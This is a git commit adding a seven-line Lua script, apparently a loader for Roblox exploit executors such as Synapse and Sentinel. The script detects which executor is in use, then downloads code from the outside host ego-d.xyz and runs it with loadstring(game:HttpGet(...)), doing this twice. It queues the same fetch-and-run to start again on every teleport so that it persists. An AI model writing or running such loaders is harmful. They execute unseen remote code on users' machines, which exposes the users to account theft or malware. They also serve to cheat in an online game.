d993d393ad8d55f8488b89f9b058250f1b8fa5f1
chimnguu <57534799+chimnguu@users.noreply.github.com>
2021-06-10 15:36:39 +0700

    Create zua_buoi.lua

---
+++ zua_buoi.lua
@@ -0,0 +1,7 @@
+local buoi = [[
+local Exploit = secure_load and "Sentinel" or syn and "Synapse"
+loadstring(game:HttpGet("https://ego-d.xyz/Script?Exploit="..Exploit))()
+loadstring(game:HttpGet("https://ego-d.xyz/Script?Exploit="..Exploit))()
+]]
+
+syn.queue_on_teleport(buoi)
